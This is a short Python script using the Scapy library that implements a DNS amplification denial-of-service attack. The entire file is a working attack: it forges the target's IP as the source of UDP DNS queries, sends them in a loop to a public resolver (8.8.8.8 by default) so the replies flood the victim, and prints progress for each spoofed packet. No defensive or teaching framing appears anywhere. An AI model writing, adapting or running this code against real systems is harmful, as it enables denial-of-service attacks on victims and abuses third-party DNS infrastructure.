from scapy.all import *
import random

def dns_amplification(target_ip, dns_server="8.8.8.8", count=100):
	print(f"Launching DNS Amplification Attack on {target_ip} via {dns_server}")

	domain_list = [
		"example.com", "openai.com", "mit.edu", "google.com",
		"yahoo.com", "amazon.com", "stackoverflow.com"
	]

	for i in range(count):
		domain = random.choice(domain_list)
		spoofed_packet = IP(src=target_ip, dst=dns_server)/UDP(sport=random.randint(1024,65535), dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
		send(spoofed_packet, verbose=False)
		print(f"[{i+1}/{count}] Sent spoofed DNS request for {domain}")

